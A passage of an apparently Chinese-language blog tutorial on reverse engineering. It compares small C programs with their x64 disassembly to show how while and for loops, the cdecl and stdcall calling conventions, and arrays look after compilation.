class="hljs-comment">//a=a+b</span><br>.text:<span class="hljs-number">0000000000401578</span>                 cmp     [rbp+var_8], <span class="hljs-number">64</span>h ; <span class="hljs-string">&#x27;d&#x27;</span>  <br>.text:<span class="hljs-number">000000000040157</span>C                 jle     <span class="hljs-keyword">short</span> loc_401572     <br>.text:<span class="hljs-number">000000000040157</span>E                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401583</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401587</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000401588</span>                 retn<br>.text:<span class="hljs-number">0000000000401588</span> main            endp<br></code></pre></td></tr></table></figure><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><p>​    while 要先比较，再跳转，一共两次，效率较低 其中第一次跳转其地址是往增量跳转,第二次跳转其地址是往减量地址跳转</p><p>​    Release版本下</p><p>　　1.常量传播的优化方式下,其代码会变成do while执行</p><p>　　2.代码外提的情况下,其代码会变成if 包含 do while执行,其中代码的条件外提.注意,函数不可以作为代码外提</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i &lt;= <span class="hljs-number">100</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nSum);<br>        nSum = nSum + i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> argc;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>  <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">0</span>    <span class="hljs-comment">//b=0</span><br>.text:<span class="hljs-number">0000000000401572</span>                 jmp     <span class="hljs-keyword">short</span> loc_40158B<br>.text:<span class="hljs-number">0000000000401574</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401574</span><br>.text:<span class="hljs-number">0000000000401574</span> loc_401574:                             ; CODE XREF: main+<span class="hljs-number">3F</span>↓j<br>.text:<span class="hljs-number">0000000000401574</span>                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">0000000000401577</span>                 mov     edx, eax<br>.text:<span class="hljs-number">0000000000401579</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span>  <span class="hljs-comment">//printf(&#x27;%d&#x27;,a);</span><br>.text:<span class="hljs-number">0000000000401580</span>                 call    <span class="hljs-built_in">printf</span>      <br>.text:<span class="hljs-number">0000000000401585</span>                 mov     eax, [rbp+var_8]   <span class="hljs-comment">//a+b</span><br>.text:<span class="hljs-number">0000000000401588</span>                 add     [rbp+var_4], eax<br>.text:<span class="hljs-number">000000000040158B</span><br>.text:<span class="hljs-number">000000000040158B</span> loc_40158B:                             ; CODE XREF: main+<span class="hljs-number">22</span>↑j<br>.text:<span class="hljs-number">000000000040158B</span>                 cmp     [rbp+var_8], <span class="hljs-number">64</span>h ; <span class="hljs-string">&#x27;d&#x27;</span>  <span class="hljs-comment">//while(b&lt;100)</span><br>.text:<span class="hljs-number">000000000040158F</span>                 jle     <span class="hljs-keyword">short</span> loc_401574   <span class="hljs-comment">//小于执行loc_401574</span><br>.text:<span class="hljs-number">0000000000401591</span>                 mov     eax, [rbp+arg_0]<br>.text:<span class="hljs-number">0000000000401594</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401598</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000401599</span>                 retn<br>.text:<span class="hljs-number">0000000000401599</span> main            endp<br></code></pre></td></tr></table></figure><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>​    for 需要三次跳转：1赋初值后要跳过步长 2循环条件的比较 3代码块执行完要跳回到步长（for也 可以转换为do）</p><p>​    for循环因为有步长的问题,所以多一次跳转. 其中 第一步跳转到 条件位置处,第二此跳转则判断条件是否成立,不成立则退出,此时找到for的下界,当前位置可以当做if的上界.</p><p>​    条件成立之后代码继续执行,则此时又来了一次跳转,此跳转跳转到步长执行代码</p><p>Release版本下</p><p>　　1.常量传播方式下 代码变为do while执行</p><p>　　2.代码外提情况下,代码变成了 if + do while的形式　</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>;i++) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nSum);<br>        nSum = nSum + i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> argc;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码</p><h4 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br><span class="hljs-comment">/*赋初值</span><br><span class="hljs-comment">.text:0000000000401564                 mov     [rbp+var_4], 0  //a=0</span><br><span class="hljs-comment">.text:000000000040156B                 mov     [rbp+var_8], 0  //b=0</span><br><span class="hljs-comment">.text:0000000000401572                 mov     [rbp+var_8], 0</span><br><span class="hljs-comment">.text:0000000000401579                 jmp     short loc_401596</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">.text:000000000040157B ; ---------------------------------------------------------------------------</span><br><span class="hljs-comment">.text:000000000040157B</span><br><span class="hljs-comment"> */</span>  <br> <br>.text:<span class="hljs-number">000000000040157B</span> loc_40157B:                             ; CODE XREF: main+<span class="hljs-number">4</span>A↓j<br>.text:<span class="hljs-number">000000000040157B</span>                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=a</span><br>.text:<span class="hljs-number">000000000040157</span>E                 mov     edx, eax  <span class="hljs-comment">//edx=a</span><br>.text:<span class="hljs-number">0000000000401580</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401587</span>                 call    <span class="hljs-built_in">printf</span>   <span class="hljs-comment">//输出a</span><br>.text:<span class="hljs-number">000000000040158</span>C                 mov     eax, [rbp+var_8]  <span class="hljs-comment">//eax=b</span><br>.text:<span class="hljs-number">000000000040158F</span>                 add     [rbp+var_4], eax  <span class="hljs-comment">//a+=b   </span><br>.text:<span class="hljs-number">0000000000401592</span>                 add     [rbp+var_8], <span class="hljs-number">1</span> <span class="hljs-comment">//b+=1  步长</span><br>.text:<span class="hljs-number">0000000000401596</span><br>.text:<span class="hljs-number">0000000000401596</span> loc_401596:                             ; CODE XREF: main+<span class="hljs-number">29</span>↑j<br>    <span class="hljs-comment">//比较</span><br>.text:<span class="hljs-number">0000000000401596</span>                 cmp     [rbp+var_8], <span class="hljs-number">63</span>h ; <span class="hljs-string">&#x27;c&#x27;</span>  <span class="hljs-comment">//99</span><br>.text:<span class="hljs-number">000000000040159</span>A                 jle     <span class="hljs-keyword">short</span> loc_40157B   <span class="hljs-comment">// </span><br>.text:<span class="hljs-number">000000000040159</span>C                 mov     eax, [rbp+arg_0]<br>.text:<span class="hljs-number">000000000040159F</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>A3                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>A4                 retn<br>.text:<span class="hljs-number">00000000004015</span>A4 main            endp<br></code></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="三种调用方式"><a href="#三种调用方式" class="headerlink" title="三种调用方式"></a>三种调用方式</h3><h4 id="cdel-调用方平衡堆栈"><a href="#cdel-调用方平衡堆栈" class="headerlink" title="__cdel 调用方平衡堆栈"></a>__cdel 调用方平衡堆栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">MyAdd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    MyAdd(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>优点：可以用于可变参数函数（因为可变参数情况下，我传几个参数我是知道的，自己 传自己删<br>缺点：增加了代码长度，调用几次子函数，就要多几次栈平衡操作</p><p>解释：这里main函数对add产生调用，main属于调用方，所以在main函数这里平衡堆栈</p><p>即 在 call 子函数 之后 add 开辟空间</p><h4 id="stdcall-被调方平衡堆栈"><a href="#stdcall-被调方平衡堆栈" class="headerlink" title="__stdcall 被调方平衡堆栈"></a>__stdcall 被调方平衡堆栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function">__int64 __stdcall <span class="hljs-title">MyAdd</span><span class="hljs-params">(<span class="hljs-keyword">float</span> a,<span class="hljs-keyword">double</span> b,<span class="hljs-keyword">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b + c;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    MyAdd(<span class="hljs-number">3.0f</span>,<span class="hljs-number">4.0f</span>,<span class="hljs-number">6</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>优点：节省代码长度 缺点：不支持可变参数（因为子函数是可重复使用的代码块，这段代码块一定是死的，<br>是不能再改变的，所以如果希望子函数平衡栈，那么它的参数个数必须确定）</p><p>解释：这里main函数对add产生调用，add函数属于被调用方，所以在add函数这里平衡堆栈</p><p>即 在 call 子函数 之前 add 开辟空间</p><h4 id="fastcall-stdcallfast版"><a href="#fastcall-stdcallfast版" class="headerlink" title="__fastcall stdcallfast版"></a>__fastcall stdcallfast版</h4><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>​    特征：连续几次赋值类型相同，且赋值的目的地址是从低到高的。 而连续定义的局部变量其赋值地址是从高到低的。 而全局数组和静态数组看上去就和连续定义同类项变量没有区别<br>​    字符串：是以’\0’结尾的char数组</p><p>​    字符串赋初值时，不是一个char一个char复制的，而是优先4字节，再2字节，最后1字节 （4-2-1）<br>​    作为参数传递：数组作为参数传递会退化为指针，因此数组参数实际上是指针，此时不能使用 sizeof获取其长度<br>​    作为返回值：禁止！局部数组的生命周期在函数返回时就结束了，因此返回的内容将不确定 可以使用全局数组、静态数组、作为参数传入的数组 静态数组作为一个整体，只占一个代表初始化的标志位（好像 多维数组的存储方式：展成一维（多维数组是C语言概念，不是汇编的概念） 转成汇编后，常量下标和一维情况完全没有区别，如[ebp+1C];<br>​    数组寻址方式 数组名和指针的区别：指针访问元素的效率比数组名要低：原因是指针是个变量，使用时要 先访问这个变量的内容（数组的首地址），再偏移（两次寻址）；而数组名自身就是常值， 直接偏移即可（一次寻址） 一维数组下：<br>​    下标是常量：编译直接计算出地址 下标是变量：先取变量，再计算偏移 下标是表达式：看复杂程度，其余同上<br>​    二维数组：<br>​        两维都是常量：编辑直接计算出地址 有一维是常量：取一次变量，之后直接计算地址<br>​        两维都是变量：取第一个变量，计算出第二维的首地址；取第二个变量，结合计算出的 首地址，求出该元素的偏移<br>​    多维数组：类推</p><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> Ary[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;i);<br><br>    Ary[i] = <span class="hljs-number">3</span>;  <span class="hljs-comment">//这句话会产生数组寻址公式</span><br>    <span class="hljs-keyword">return</span> Ary[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_10          = dword ptr <span class="hljs-number">-10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_C           = dword ptr <span class="hljs-number">-0</span>Ch<br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_C], <span class="hljs-number">0</span>  <span class="hljs-comment">//a[0]=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">1</span>  <span class="hljs-comment">//a[1]=1</span><br>.text:<span class="hljs-number">0000000000401572</span>                 mov     [rbp+var_4], <span class="hljs-number">2</span>  <span class="hljs-comment">//a[2]=2</span><br>.text:<span class="hljs-number">0000000000401579</span>                 mov     [rbp+var_10], <span class="hljs-number">0</span>  <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">0000000000401580</span>                 lea     rax, [rbp+var_10] <br>.text:<span class="hljs-number">0000000000401584</span>                 mov     rdx, rax<br>.text:<span class="hljs-number">0000000000401587</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span> <span class="hljs-comment">//scanf(&quot;&quot;);</span><br>.text:<span class="hljs-number">000000000040158</span>E                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">0000000000401593</span>                 mov     eax, [rbp+var_10]<br>.text:<span class="hljs-number">0000000000401596</span>                 cdqe<br>.text:<span class="hljs-number">0000000000401598</span>                 mov     [rbp+rax*<span class="hljs-number">4</span>+var_C], <span class="hljs-number">3</span> <span class="hljs-comment">//a[]</span><br>.text:<span class="hljs-number">00000000004015</span>A0                 mov     eax, [rbp+var_10]<br>.text:<span class="hljs-number">00000000004015</span>A3                 cdqe<br>.text:<span class="hljs-number">00000000004015</span>A5                 mov     eax, [rbp+rax*<span class="hljs-number">4</span>+var_C]<br>.text:<span class="hljs-number">00000000004015</span>A9                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>AD                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>AE                 retn<br>.text:<span class="hljs-number">00000000004015</span>AE main            endp<br></code></pre></td></tr></table></figure><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> Ary[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;k);<br><br>    Ary[i][j][k] = <span class="hljs-number">9</span>;  <span class="hljs-comment">//会产生数组寻址公式</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_7C          = dword ptr <span class="hljs-number">-7</span>Ch<br>.text:<span class="hljs-number">0000000000401550</span> var_78          = dword ptr <span class="hljs-number">-78</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_74          = dword ptr <span class="hljs-number">-74</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_70          = dword ptr <span class="hljs-number">-70</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 push    rdi<br>.text:<span 